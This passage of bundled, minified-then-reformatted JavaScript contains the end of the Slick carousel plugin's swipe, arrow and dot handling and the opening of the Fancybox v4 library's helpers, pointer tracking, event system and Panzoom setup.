            : (!0 === l.options.verticalSwiping &&
                (l.touchObject.swipeLength = r),
              (t = l.swipeDirection()),
              void 0 !== i.originalEvent &&
                l.touchObject.swipeLength > 4 &&
                ((l.swiping = !0), i.preventDefault()),
              (s =
                (!1 === l.options.rtl ? 1 : -1) *
                (l.touchObject.curX > l.touchObject.startX ? 1 : -1)),
              !0 === l.options.verticalSwiping &&
                (s = l.touchObject.curY > l.touchObject.startY ? 1 : -1),
              (o = l.touchObject.swipeLength),
              (l.touchObject.edgeHit = !1),
              !1 === l.options.infinite &&
                ((0 === l.currentSlide && "right" === t) ||
                  (l.currentSlide >= l.getDotCount() && "left" === t)) &&
                ((o = l.touchObject.swipeLength * l.options.edgeFriction),
                (l.touchObject.edgeHit = !0)),
              !1 === l.options.vertical
                ? (l.swipeLeft = e + o * s)
                : (l.swipeLeft = e + o * (l.$list.height() / l.listWidth) * s),
              !0 === l.options.verticalSwiping && (l.swipeLeft = e + o * s),
              !0 !== l.options.fade &&
                !1 !== l.options.touchMove &&
                (!0 === l.animating
                  ? ((l.swipeLeft = null), !1)
                  : void l.setCSS(l.swipeLeft))))
      );
    }),
    (e.prototype.swipeStart = function (i) {
      var e,
        t = this;
      if (
        ((t.interrupted = !0),
        1 !== t.touchObject.fingerCount ||
          t.slideCount <= t.options.slidesToShow)
      )
        return (t.touchObject = {}), !1;
      void 0 !== i.originalEvent &&
        void 0 !== i.originalEvent.touches &&
        (e = i.originalEvent.touches[0]),
        (t.touchObject.startX = t.touchObject.curX =
          void 0 !== e ? e.pageX : i.clientX),
        (t.touchObject.startY = t.touchObject.curY =
          void 0 !== e ? e.pageY : i.clientY),
        (t.dragging = !0);
    }),
    (e.prototype.unfilterSlides = e.prototype.slickUnfilter =
      function () {
        var i = this;
        null !== i.$slidesCache &&
          (i.unload(),
          i.$slideTrack.children(this.options.slide).detach(),
          i.$slidesCache.appendTo(i.$slideTrack),
          i.reinit());
      }),
    (e.prototype.unload = function () {
      var e = this;
      i(".slick-cloned", e.$slider).remove(),
        e.$dots && e.$dots.remove(),
        e.$prevArrow &&
          e.htmlExpr.test(e.options.prevArrow) &&
          e.$prevArrow.remove(),
        e.$nextArrow &&
          e.htmlExpr.test(e.options.nextArrow) &&
          e.$nextArrow.remove(),
        e.$slides
          .removeClass("slick-slide slick-active slick-visible slick-current")
          .attr("aria-hidden", "true")
          .css("width", "");
    }),
    (e.prototype.unslick = function (i) {
      var e = this;
      e.$slider.trigger("unslick", [e, i]), e.destroy();
    }),
    (e.prototype.updateArrows = function () {
      var i = this;
      Math.floor(i.options.slidesToShow / 2),
        !0 === i.options.arrows &&
          i.slideCount > i.options.slidesToShow &&
          !i.options.infinite &&
          (i.$prevArrow
            .removeClass("slick-disabled")
            .attr("aria-disabled", "false"),
          i.$nextArrow
            .removeClass("slick-disabled")
            .attr("aria-disabled", "false"),
          0 === i.currentSlide
            ? (i.$prevArrow
                .addClass("slick-disabled")
                .attr("aria-disabled", "true"),
              i.$nextArrow
                .removeClass("slick-disabled")
                .attr("aria-disabled", "false"))
            : i.currentSlide >= i.slideCount - i.options.slidesToShow &&
              !1 === i.options.centerMode
            ? (i.$nextArrow
                .addClass("slick-disabled")
                .attr("aria-disabled", "true"),
              i.$prevArrow
                .removeClass("slick-disabled")
                .attr("aria-disabled", "false"))
            : i.currentSlide >= i.slideCount - 1 &&
              !0 === i.options.centerMode &&
              (i.$nextArrow
                .addClass("slick-disabled")
                .attr("aria-disabled", "true"),
              i.$prevArrow
                .removeClass("slick-disabled")
                .attr("aria-disabled", "false")));
    }),
    (e.prototype.updateDots = function () {
      var i = this;
      null !== i.$dots &&
        (i.$dots.find("li").removeClass("slick-active").end(),
        i.$dots
          .find("li")
          .eq(Math.floor(i.currentSlide / i.options.slidesToScroll))
          .addClass("slick-active"));
    }),
    (e.prototype.visibility = function () {
      var i = this;
      i.options.autoplay &&
        (document[i.hidden] ? (i.interrupted = !0) : (i.interrupted = !1));
    }),
    (i.fn.slick = function () {
      var i,
        t,
        o = this,
        s = arguments[0],
        n = Array.prototype.slice.call(arguments, 1),
        r = o.length;
      for (i = 0; i < r; i++)
        if (
          ("object" == typeof s || void 0 === s
            ? (o[i].slick = new e(o[i], s))
            : (t = o[i].slick[s].apply(o[i].slick, n)),
          void 0 !== t)
        )
          return t;
      return o;
    });
});
// @fancyapps/ui/Fancybox v4.0.26
!(function (t, e) {
  "object" == typeof exports && "undefined" != typeof module
    ? e(exports)
    : "function" == typeof define && define.amd
    ? define(["exports"], e)
    : e(
        ((t =
          "undefined" != typeof globalThis ? globalThis : t || self).window =
          t.window || {})
      );
})(this, function (t) {
  "use strict";
  function e(t, e) {
    var i = Object.keys(t);
    if (Object.getOwnPropertySymbols) {
      var n = Object.getOwnPropertySymbols(t);
      e &&
        (n = n.filter(function (e) {
          return Object.getOwnPropertyDescriptor(t, e).enumerable;
        })),
        i.push.apply(i, n);
    }
    return i;
  }
  function i(t) {
    for (var i = 1; i < arguments.length; i++) {
      var n = null != arguments[i] ? arguments[i] : {};
      i % 2
        ? e(Object(n), !0).forEach(function (e) {
            r(t, e, n[e]);
          })
        : Object.getOwnPropertyDescriptors
        ? Object.defineProperties(t, Object.getOwnPropertyDescriptors(n))
        : e(Object(n)).forEach(function (e) {
            Object.defineProperty(t, e, Object.getOwnPropertyDescriptor(n, e));
          });
    }
    return t;
  }
  function n(t) {
    return (
      (n =
        "function" == typeof Symbol && "symbol" == typeof Symbol.iterator
          ? function (t) {
              return typeof t;
            }
          : function (t) {
              return t &&
                "function" == typeof Symbol &&
                t.constructor === Symbol &&
                t !== Symbol.prototype
                ? "symbol"
                : typeof t;
            }),
      n(t)
    );
  }
  function o(t, e) {
    if (!(t instanceof e))
      throw new TypeError("Cannot call a class as a function");
  }
  function a(t, e) {
    for (var i = 0; i < e.length; i++) {
      var n = e[i];
      (n.enumerable = n.enumerable || !1),
        (n.configurable = !0),
        "value" in n && (n.writable = !0),
        Object.defineProperty(t, n.key, n);
    }
  }
  function s(t, e, i) {
    return (
      e && a(t.prototype, e),
      i && a(t, i),
      Object.defineProperty(t, "prototype", { writable: !1 }),
      t
    );
  }
  function r(t, e, i) {
    return (
      e in t
        ? Object.defineProperty(t, e, {
            value: i,
            enumerable: !0,
            configurable: !0,
            writable: !0,
          })
        : (t[e] = i),
      t
    );
  }
  function l(t, e) {
    if ("function" != typeof e && null !== e)
      throw new TypeError("Super expression must either be null or a function");
    (t.prototype = Object.create(e && e.prototype, {
      constructor: { value: t, writable: !0, configurable: !0 },
    })),
      Object.defineProperty(t, "prototype", { writable: !1 }),
      e && h(t, e);
  }
  function c(t) {
    return (
      (c = Object.setPrototypeOf
        ? Object.getPrototypeOf
        : function (t) {
            return t.__proto__ || Object.getPrototypeOf(t);
          }),
      c(t)
    );
  }
  function h(t, e) {
    return (
      (h =
        Object.setPrototypeOf ||
        function (t, e) {
          return (t.__proto__ = e), t;
        }),
      h(t, e)
    );
  }
  function d(t) {
    if (void 0 === t)
      throw new ReferenceError(
        "this hasn't been initialised - super() hasn't been called"
      );
    return t;
  }
  function u(t, e) {
    if (e && ("object" == typeof e || "function" == typeof e)) return e;
    if (void 0 !== e)
      throw new TypeError(
        "Derived constructors may only return object or undefined"
      );
    return d(t);
  }
  function f(t) {
    var e = (function () {
      if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
      if (Reflect.construct.sham) return !1;
      if ("function" == typeof Proxy) return !0;
      try {
        return (
          Boolean.prototype.valueOf.call(
            Reflect.construct(Boolean, [], function () {})
          ),
          !0
        );
      } catch (t) {
        return !1;
      }
    })();
    return function () {
      var i,
        n = c(t);
      if (e) {
        var o = c(this).constructor;
        i = Reflect.construct(n, arguments, o);
      } else i = n.apply(this, arguments);
      return u(this, i);
    };
  }
  function v(t, e) {
    for (
      ;
      !Object.prototype.hasOwnProperty.call(t, e) && null !== (t = c(t));

    );
    return t;
  }
  function p() {
    return (
      (p =
        "undefined" != typeof Reflect && Reflect.get
          ? Reflect.get
          : function (t, e, i) {
              var n = v(t, e);
              if (n) {
                var o = Object.getOwnPropertyDescriptor(n, e);
                return o.get
                  ? o.get.call(arguments.length < 3 ? t : i)
                  : o.value;
              }
            }),
      p.apply(this, arguments)
    );
  }
  function g(t, e) {
    return (
      (function (t) {
        if (Array.isArray(t)) return t;
      })(t) ||
      (function (t, e) {
        var i =
          null == t
            ? null
            : ("undefined" != typeof Symbol && t[Symbol.iterator]) ||
              t["@@iterator"];
        if (null == i) return;
        var n,
          o,
          a = [],
          s = !0,
          r = !1;
        try {
          for (
            i = i.call(t);
            !(s = (n = i.next()).done) &&
            (a.push(n.value), !e || a.length !== e);
            s = !0
          );
        } catch (t) {
          (r = !0), (o = t);
        } finally {
          try {
            s || null == i.return || i.return();
          } finally {
            if (r) throw o;
          }
        }
        return a;
      })(t, e) ||
      y(t, e) ||
      (function () {
        throw new TypeError(
          "Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method."
        );
      })()
    );
  }
  function m(t) {
    return (
      (function (t) {
        if (Array.isArray(t)) return b(t);
      })(t) ||
      (function (t) {
        if (
          ("undefined" != typeof Symbol && null != t[Symbol.iterator]) ||
          null != t["@@iterator"]
        )
          return Array.from(t);
      })(t) ||
      y(t) ||
      (function () {
        throw new TypeError(
          "Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method."
        );
      })()
    );
  }
  function y(t, e) {
    if (t) {
      if ("string" == typeof t) return b(t, e);
      var i = Object.prototype.toString.call(t).slice(8, -1);
      return (
        "Object" === i && t.constructor && (i = t.constructor.name),
        "Map" === i || "Set" === i
          ? Array.from(t)
          : "Arguments" === i ||
            /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(i)
          ? b(t, e)
          : void 0
      );
    }
  }
  function b(t, e) {
    (null == e || e > t.length) && (e = t.length);
    for (var i = 0, n = new Array(e); i < e; i++) n[i] = t[i];
    return n;
  }
  function x(t, e) {
    var i =
      ("undefined" != typeof Symbol && t[Symbol.iterator]) || t["@@iterator"];
    if (!i) {
      if (
        Array.isArray(t) ||
        (i = y(t)) ||
        (e && t && "number" == typeof t.length)
      ) {
        i && (t = i);
        var n = 0,
          o = function () {};
        return {
          s: o,
          n: function () {
            return n >= t.length ? { done: !0 } : { done: !1, value: t[n++] };
          },
          e: function (t) {
            throw t;
          },
          f: o,
        };
      }
      throw new TypeError(
        "Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method."
      );
    }
    var a,
      s = !0,
      r = !1;
    return {
      s: function () {
        i = i.call(t);
      },
      n: function () {
        var t = i.next();
        return (s = t.done), t;
      },
      e: function (t) {
        (r = !0), (a = t);
      },
      f: function () {
        try {
          s || null == i.return || i.return();
        } finally {
          if (r) throw a;
        }
      },
    };
  }
  var w = function (t) {
      return (
        "object" === n(t) &&
        null !== t &&
        t.constructor === Object &&
        "[object Object]" === Object.prototype.toString.call(t)
      );
    },
    k = function t() {
      for (
        var e = !1, i = arguments.length, o = new Array(i), a = 0;
        a < i;
        a++
      )
        o[a] = arguments[a];
      "boolean" == typeof o[0] && (e = o.shift());
      var s = o[0];
      if (!s || "object" !== n(s))
        throw new Error("extendee must be an object");
      for (var r = o.slice(1), l = r.length, c = 0; c < l; c++) {
        var h = r[c];
        for (var d in h)
          if (h.hasOwnProperty(d)) {
            var u = h[d];
            if (e && (Array.isArray(u) || w(u))) {
              var f = Array.isArray(u) ? [] : {};
              s[d] = t(!0, s.hasOwnProperty(d) ? s[d] : f, u);
            } else s[d] = u;
          }
      }
      return s;
    },
    S = function (t) {
      var e =
        arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
      return (t = parseFloat(t) || 0), Math.round((t + Number.EPSILON) * e) / e;
    },
    C = function t(e) {
      return (
        !!(
          e &&
          "object" === n(e) &&
          e instanceof Element &&
          e !== document.body
        ) &&
        !e.__Panzoom &&
        ((function (t) {
          var e = getComputedStyle(t)["overflow-y"],
            i = getComputedStyle(t)["overflow-x"],
            n =
              ("scroll" === e || "auto" === e) &&
              Math.abs(t.scrollHeight - t.clientHeight) > 1,
            o =
              ("scroll" === i || "auto" === i) &&
              Math.abs(t.scrollWidth - t.clientWidth) > 1;
          return n || o;
        })(e)
          ? e
          : t(e.parentNode))
      );
    },
    $ =
      ("undefined" != typeof window && window.ResizeObserver) ||
      (function () {
        function t(e) {
          o(this, t),
            (this.observables = []),
            (this.boundCheck = this.check.bind(this)),
            this.boundCheck(),
            (this.callback = e);
        }
        return (
          s(t, [
            {
              key: "observe",
              value: function (t) {
                if (
                  !this.observables.some(function (e) {
                    return e.el === t;
                  })
                ) {
                  var e = {
                    el: t,
                    size: { height: t.clientHeight, width: t.clientWidth },
                  };
                  this.observables.push(e);
                }
              },
            },
            {
              key: "unobserve",
              value: function (t) {
                this.observables = this.observables.filter(function (e) {
                  return e.el !== t;
                });
              },
            },
            {
              key: "disconnect",
              value: function () {
                this.observables = [];
              },
            },
            {
              key: "check",
              value: function () {
                var t = this.observables
                  .filter(function (t) {
                    var e = t.el.clientHeight,
                      i = t.el.clientWidth;
                    if (t.size.height !== e || t.size.width !== i)
                      return (t.size.height = e), (t.size.width = i), !0;
                  })
                  .map(function (t) {
                    return t.el;
                  });
                t.length > 0 && this.callback(t),
                  window.requestAnimationFrame(this.boundCheck);
              },
            },
          ]),
          t
        );
      })(),
    E = s(function t(e) {
      o(this, t),
        (this.id = self.Touch && e instanceof Touch ? e.identifier : -1),
        (this.pageX = e.pageX),
        (this.pageY = e.pageY),
        (this.clientX = e.clientX),
        (this.clientY = e.clientY);
    }),
    P = function (t, e) {
      return e
        ? Math.sqrt(
            Math.pow(e.clientX - t.clientX, 2) +
              Math.pow(e.clientY - t.clientY, 2)
          )
        : 0;
    },
    T = function (t, e) {
      return e
        ? {
            clientX: (t.clientX + e.clientX) / 2,
            clientY: (t.clientY + e.clientY) / 2,
          }
        : t;
    },
    L = function (t) {
      return "changedTouches" in t;
    },
    _ = (function () {
      function t(e) {
        var i = this,
          n =
            arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
          a = n.start,
          s =
            void 0 === a
              ? function () {
                  return !0;
                }
              : a,
          r = n.move,
          l = void 0 === r ? function () {} : r,
          c = n.end,
          h = void 0 === c ? function () {} : c;
        o(this, t),
          (this._element = e),
          (this.startPointers = []),
          (this.currentPointers = []),
          (this._pointerStart = function (t) {
            if (!(t.buttons > 0 && 0 !== t.button)) {
              var e = new E(t);
              i.currentPointers.some(function (t) {
                return t.id === e.id;
              }) ||
                (i._triggerPointerStart(e, t) &&
                  (window.addEventListener("mousemove", i._move),
                  window.addEventListener("mouseup", i._pointerEnd)));
            }
          }),
          (this._touchStart = function (t) {
            for (
              var e = 0, n = Array.from(t.changedTouches || []);
              e < n.length;
              e++
            ) {
              var o = n[e];
              i._triggerPointerStart(new E(o), t);
            }
          }),
          (this._move = function (t) {
            var e,
              n = i.currentPointers.slice(),
              o = L(t)
                ? Array.from(t.changedTouches).map(function (t) {
                    return new E(t);
                  })
                : [new E(t)],
              a = [],
              s = x(o);
            try {
              var r = function () {
                var t = e.value,
                  n = i.currentPointers.findIndex(function (e) {
                    return e.id === t.id;
                  });
                if (n < 0) return "continue";
                a.push(t), (i.currentPointers[n] = t);
              };
              for (s.s(); !(e = s.n()).done; ) r();
            } catch (t) {
              s.e(t);
            } finally {
              s.f();
            }
            i._moveCallback(n, i.currentPointers.slice(), t);
          }),
          (this._triggerPointerEnd = function (t, e) {
            var n = i.currentPointers.findIndex(function (e) {
              return e.id === t.id;
            });
            return (
              !(n < 0) &&
              (i.currentPointers.splice(n, 1),
              i.startPointers.splice(n, 1),
              i._endCallback(t, e),
              !0)
            );
          }),
          (this._pointerEnd = function (t) {
            (t.buttons > 0 && 0 !== t.button) ||
              (i._triggerPointerEnd(new E(t), t) &&
                (window.removeEventListener("mousemove", i._move, {
                  passive: !1,
                }),
                window.removeEventListener("mouseup", i._pointerEnd, {
                  passive: !1,
                })));
          }),
          (this._touchEnd = function (t) {
            for (
              var e = 0, n = Array.from(t.changedTouches || []);
              e < n.length;
              e++
            ) {
              var o = n[e];
              i._triggerPointerEnd(new E(o), t);
            }
          }),
          (this._startCallback = s),
          (this._moveCallback = l),
          (this._endCallback = h),
          this._element.addEventListener("mousedown", this._pointerStart, {
            passive: !1,
          }),
          this._element.addEventListener("touchstart", this._touchStart, {
            passive: !1,
          }),
          this._element.addEventListener("touchmove", this._move, {
            passive: !1,
          }),
          this._element.addEventListener("touchend", this._touchEnd),
          this._element.addEventListener("touchcancel", this._touchEnd);
      }
      return (
        s(t, [
          {
            key: "stop",
            value: function () {
              this._element.removeEventListener(
                "mousedown",
                this._pointerStart,
                { passive: !1 }
              ),
                this._element.removeEventListener(
                  "touchstart",
                  this._touchStart,
                  { passive: !1 }
                ),
                this._element.removeEventListener("touchmove", this._move, {
                  passive: !1,
                }),
                this._element.removeEventListener("touchend", this._touchEnd),
                this._element.removeEventListener(
                  "touchcancel",
                  this._touchEnd
                ),
                window.removeEventListener("mousemove", this._move),
                window.removeEventListener("mouseup", this._pointerEnd);
            },
          },
          {
            key: "_triggerPointerStart",
            value: function (t, e) {
              return (
                !!this._startCallback(t, e) &&
                (this.currentPointers.push(t), this.startPointers.push(t), !0)
              );
            },
          },
        ]),
        t
      );
    })(),
    A = function (t, e) {
      return t.split(".").reduce(function (t, e) {
        return t && t[e];
      }, e);
    },
    O = (function () {
      function t() {
        var e =
          arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
        o(this, t),
          (this.options = k(!0, {}, e)),
          (this.plugins = []),
          (this.events = {});
        for (var i = 0, n = ["on", "once"]; i < n.length; i++)
          for (
            var a = n[i], s = 0, r = Object.entries(this.options[a] || {});
            s < r.length;
            s++
          ) {
            var l = r[s];
            this[a].apply(this, m(l));
          }
      }
      return (
        s(t, [
          {
            key: "option",
            value: function (t, e) {
              t = String(t);
              var i = A(t, this.options);
              if ("function" == typeof i) {
                for (
                  var n,
                    o = arguments.length,
                    a = new Array(o > 2 ? o - 2 : 0),
                    s = 2;
                  s < o;
                  s++
                )
                  a[s - 2] = arguments[s];
                i = (n = i).call.apply(n, [this, this].concat(a));
              }
              return void 0 === i ? e : i;
            },
          },
          {
            key: "localize",
            value: function (t) {
              var e = this,
                i =
                  arguments.length > 1 && void 0 !== arguments[1]
                    ? arguments[1]
                    : [];
              return (t = (t = String(t).replace(
                /\{\{(\w+).?(\w+)?\}\}/g,
                function (t, n, o) {
                  var a = "";
                  o
                    ? (a = e.option(
                        ""
                          .concat(n[0] + n.toLowerCase().substring(1), ".l10n.")
                          .concat(o)
                      ))
                    : n && (a = e.option("l10n.".concat(n))),
                    a || (a = t);
                  for (var s = 0; s < i.length; s++)
                    a = a.split(i[s][0]).join(i[s][1]);
                  return a;
                }
              )).replace(/\{\{(.*)\}\}/, function (t, e) {
                return e;
              }));
            },
          },
          {
            key: "on",
            value: function (t, e) {
              var i = this;
              if (w(t)) {
                for (var n = 0, o = Object.entries(t); n < o.length; n++) {
                  var a = o[n];
                  this.on.apply(this, m(a));
                }
                return this;
              }
              return (
                String(t)
                  .split(" ")
                  .forEach(function (t) {
                    var n = (i.events[t] = i.events[t] || []);
                    -1 == n.indexOf(e) && n.push(e);
                  }),
                this
              );
            },
          },
          {
            key: "once",
            value: function (t, e) {
              var i = this;
              if (w(t)) {
                for (var n = 0, o = Object.entries(t); n < o.length; n++) {
                  var a = o[n];
                  this.once.apply(this, m(a));
                }
                return this;
              }
              return (
                String(t)
                  .split(" ")
                  .forEach(function (t) {
                    var n = function n() {
                      i.off(t, n);
                      for (
                        var o = arguments.length, a = new Array(o), s = 0;
                        s < o;
                        s++
                      )
                        a[s] = arguments[s];
                      e.call.apply(e, [i, i].concat(a));
                    };
                    (n._ = e), i.on(t, n);
                  }),
                this
              );
            },
          },
          {
            key: "off",
            value: function (t, e) {
              var i = this;
              if (!w(t))
                return (
                  t.split(" ").forEach(function (t) {
                    var n = i.events[t];
                    if (!n || !n.length) return i;
                    for (var o = -1, a = 0, s = n.length; a < s; a++) {
                      var r = n[a];
                      if (r && (r === e || r._ === e)) {
                        o = a;
                        break;
                      }
                    }
                    -1 != o && n.splice(o, 1);
                  }),
                  this
                );
              for (var n = 0, o = Object.entries(t); n < o.length; n++) {
                var a = o[n];
                this.off.apply(this, m(a));
              }
            },
          },
          {
            key: "trigger",
            value: function (t) {
              for (
                var e = arguments.length,
                  i = new Array(e > 1 ? e - 1 : 0),
                  n = 1;
                n < e;
                n++
              )
                i[n - 1] = arguments[n];
              var o,
                a = x(m(this.events[t] || []).slice());
              try {
                for (a.s(); !(o = a.n()).done; ) {
                  var s = o.value;
                  if (s && !1 === s.call.apply(s, [this, this].concat(i)))
                    return !1;
                }
              } catch (t) {
                a.e(t);
              } finally {
                a.f();
              }
              var r,
                l = x(m(this.events["*"] || []).slice());
              try {
                for (l.s(); !(r = l.n()).done; ) {
                  var c = r.value;
                  if (c && !1 === c.call.apply(c, [this, t, this].concat(i)))
                    return !1;
                }
              } catch (t) {
                l.e(t);
              } finally {
                l.f();
              }
              return !0;
            },
          },
          {
            key: "attachPlugins",
            value: function (t) {
              for (
                var e = {}, i = 0, n = Object.entries(t || {});
                i < n.length;
                i++
              ) {
                var o = g(n[i], 2),
                  a = o[0],
                  s = o[1];
                !1 === this.options[a] ||
                  this.plugins[a] ||
                  ((this.options[a] = k({}, s.defaults || {}, this.options[a])),
                  (e[a] = new s(this)));
              }
              for (var r = 0, l = Object.entries(e); r < l.length; r++) {
                var c = g(l[r], 2);
                c[0], c[1].attach(this);
              }
              return (this.plugins = Object.assign({}, this.plugins, e)), this;
            },
          },
          {
            key: "detachPlugins",
            value: function () {
              for (var t in this.plugins) {
                var e = void 0;
                (e = this.plugins[t]) &&
                  "function" == typeof e.detach &&
                  e.detach(this);
              }
              return (this.plugins = {}), this;
            },
          },
        ]),
        t
      );
    })(),
    z = {
      touch: !0,
      zoom: !0,
      pinchToZoom: !0,
      panOnlyZoomed: !1,
      lockAxis: !1,
      friction: 0.64,
      decelFriction: 0.88,
      zoomFriction: 0.74,
      bounceForce: 0.2,
      baseScale: 1,
      minScale: 1,
      maxScale: 2,
      step: 0.5,
      textSelection: !1,
      click: "toggleZoom",
      wheel: "zoom",
      wheelFactor: 42,
      wheelLimit: 5,
      draggableClass: "is-draggable",
      draggingClass: "is-dragging",
      ratio: 1,
    },
    M = (function (t) {
      l(n, t);
      var e = f(n);
      function n(t) {
        var i,
          a =
            arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
        o(this, n),
          ((i = e.call(this, k(!0, {}, z, a))).state = "init"),
          (i.$container = t);
        for (
          var s = 0, r = ["onLoad", "onWheel", "onClick"];
          s < r.length;
          s++
        ) {
          var l = r[s];
          i[l] = i[l].bind(d(i));
        }
        return (
          i.initLayout(),
          i.resetValues(),
          i.attachPlugins(n.Plugins),
          i.trigger("init"),
          i.updateMetrics(),
          i.attachEvents(),
          i.trigger("ready"),
          !1 === i.option("centerOnStart")
            ? (i.state = "ready")
            : i.panTo({ friction: 0 }),
          (t.__Panzoom = d(i)),
          i
        );
      }
      return (
        s(n, [
          {
            key: "initLayout",
            value: function () {
              var t = this.$container;
              if (!(t instanceof HTMLElement))
                throw new Error("Panzoom: Container not found");
              var e =
                this.option("content") || t.querySelector(".panzoom__content");
              if (!e) throw new Error("Panzoom: Content not found");
              this.$content = e;
              var i,
                n =
                  this.option("viewport") ||
                  t.querySelector(".panzoom__viewport");
              n ||
                !1 === this.option("wrapInner") ||
                ((n = document.createElement("div")).classList.add(
                  "panzoom__viewport"
                ),
                (i = n).append.apply(i, m(t.childNodes)),
                t.appendChild(n));
              this.$viewport = n || e.parentNode;
            },
          },
          {
            key: "resetValues",
            value: function () {
              (this.updateRate = this.option(
                "updateRate",
                /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? 250 : 24
              )),
                (this.container = { width: 0, height: 0 }),
                (this.viewport = { width: 0, height: 0 }),
                (this.content = {
                  origWidth: 0,
                  origHeight: 0,
                  width: 0,
                  height: 0,
                  x: this.option("x", 0),
                  y: this.option("y", 0),
                  scale: this.option("baseScale"),
                }),
                (this.transform = { x: 0, y: 0, scale: 1 }),
                this.resetDragPosition();
            },
          },
          {
            key: "onLoad",
            value: function (t) {
              this.updateMetrics(),
                this.panTo({ scale: this.option("baseScale"), friction: 0 }),
                this.trigger("load", t);
            },
          },
          {
            key: "onClick",
            value: function (t) {
              if (!t.defaultPrevented)
                if (
                  this.option("textSelection") &&
                  window.getSelection().toString().length
                )
                  t.stopPropagation();
                else {
                  var e = this.$content.getClientRects()[0];
                  if (
                    "ready" !== this.state &&
                    (this.dragPosition.midPoint ||
                      Math.abs(e.top - this.dragStart.rect.top) > 1 ||
                      Math.abs(e.left - this.dragStart.rect.left) > 1)
                  )
                    return t.preventDefault(), void t.stopPropagation();
                  !1 !== this.trigger("click", t) &&
                    this.option("zoom") &&
                    "toggleZoom" === this.option("click") &&
                    (t.preventDefault(),
                    t.stopPropagation(),
                    this.zoomWithClick(t));
                }
            },
          },
          {
            key: "onWheel",
            value: function (t) {
              !1 !== this.trigger("wheel", t) &&
                this.option("zoom") &&
                this.option("wheel") &&
                this.zoomWithWheel(t);
            },
          },
          {
            key: "zoomWithWheel",
            value: function (t) {
              void 0 === this.changedDelta && (this.changedDelta = 0);
              var e = Math.max(
                  -1,
                  Math.min(
                    1,
                    -t.deltaY || -t.deltaX || t.wheelDelta || -t.detail
                  )
                ),
                i = this.content.scale,
                n = (i * (100 + e * this.option("wheelFactor"))) / 100;
              if (
                ((e < 0 && Math.abs(i - this.option("minScale")) < 0.01) ||
                (e > 0 && Math.abs(i - this.option("maxScale")) < 0.01)
                  ? ((this.changedDelta += Math.abs(e)), (n = i))
                  : ((this.changedDelta = 0),
                    (n = Math.max(
                      Math.min(n, this.option("maxScale")),
                      this.option("minScale")
                    ))),
                !(this.changedDelta > this.option("wheelLimit")) &&
                  (t.preventDefault(), n !== i))
              ) {
                var o = this.$content.getBoundingClientRect(),
                  a = t.clientX - o.left,
                  s = t.clientY - o.top;
                this.zoomTo(n, { x: a, y: s });
              }
            },
          },
          {
            key: "zoomWithClick",
            value: function (t) {
              var e = this.$content.getClientRects()[0],
                i = t.clientX - e.left,
                n = t.clientY - e.top;
              this.toggleZoom({ x: i, y: n });
            },
          },
          {
            key: "attachEvents",
            value: function () {
              var t = this;
              this.$content.addEventListener("load", this.onLoad),
                this.$container.addEventListener("wheel", this.onWheel, {
                  passive: !1,
                }),
                this.$container.addEventListener("click", this.onClick, {
                  passive: !1,
                }),
                this.initObserver();
              var e = new _(this.$container, {
                start: function (i, n) {
                  if (!t.option("touch")) return !1;
                  if (t.velocity.scale < 0) return !1;
                  var o = n.composedPath()[0];
                  if (!e.currentPointers.length) {
                    if (
                      -1 !==
                      [
                        "BUTTON",
                        "TEXTAREA",
                        "OPTION",
                        "INPUT",
                        "SELECT",
                        "VIDEO",
                      ].indexOf(o.nodeName)
                    )
                      return !1;
                    if (
                      t.option("textSelection") &&
                      (function (t, e, i) {
                        for (
                          var n = t.childNodes,
                            o = document.createRange(),
                            a = 0;
                          a < n.length;
                          a++
                        ) {
                          var s = n[a];
                          if (s.nodeType === Node.TEXT_NODE) {
                            o.selectNodeContents(s);
                            var r = o.getBoundingClientRect();
                            if (
                              e >= r.left &&
                              i >= r.top &&
                              e <= r.right &&
                              i <= r.bottom
                            )
                              return s;
                          }
                        }
                        return !1;
                      })(o, i.clientX, i.clientY)
                    )
                      return !1;
                  }
                  return (
                    !C(o) &&
                    !1 !== t.trigger("touchStart", n) &&
                    ("mousedown" === n.type && n.preventDefault(),
                    (t.state = "pointerdown"),
                    t.resetDragPosition(),
                    (t.dragPosition.midPoint = null),
                    (t.dragPosition.time = Date.now()),
                    !0)
                  );
                },
                move: function (i, n, o) {
                  if ("pointerdown" === t.state)
                    if (!1 !== t.trigger("touchMove", o)) {
                      if (
                        !(
                          n.length < 2 &&
                          !0 === t.option("panOnlyZoomed") &&
                          t.content.width <= t.viewport.width &&
                          t.content.height <= t.viewport.height &&
                          t.transform.scale <= t.option("baseScale")
                        ) &&
                        (!(n.length > 1) ||
                          (t.option("zoom") && !1 !== t.option("pinchToZoom")))
                      ) {
                        var a = T(i[0], i[1]),
                          s = T(n[0], n[1]),
                          r = s.clientX - a.clientX,
                          l = s.clientY - a.clientY,
                          c = P(i[0], i[1]),
                          h = P(n[0], n[1]),
                          d = c && h ? h / c : 1;
                        (t.dragOffset.x += r),
                          (t.dragOffset.y += l),
                          (t.dragOffset.scale *= d),
                          (t.dragOffset.time =
                            Date.now() - t.dragPosition.time);
                        var u = 1 === t.dragStart.scale && t.option("lockAxis");
                        if (u && !t.lockAxis) {
                          if (
                            Math.abs(t.dragOffset.x) < 6 &&
                            Math.abs(t.dragOffset.y) < 6
                          )
                            return void o.preventDefault();
                          var f = Math.abs(
                            (180 * Math.atan2(t.dragOffset.y, t.dragOffset.x)) /
                              Math.PI
                          );
                          t.lockAxis = f > 45 && f < 135 ? "y" : "x";
                        }
                        if ("xy" === u || "y" !== t.lockAxis) {
                          if (
                            (o.preventDefault(),
                            o.stopPropagation(),
                            o.stopImmediatePropagation(),
                            t.lockAxis &&
                              (t.dragOffset[
                                "x" === t.lockAxis ? "y" : "x"
                              ] = 0),
                            t.$container.classList.add(
                              t.option("draggingClass")
                            ),
                            (t.transform.scale === t.option("baseScale") &&
                              "y" === t.lockAxis) ||
                              (t.dragPosition.x =
                                t.dragStart.x + t.dragOffset.x),
                            (t.transform.scale === t.option("baseScale") &&
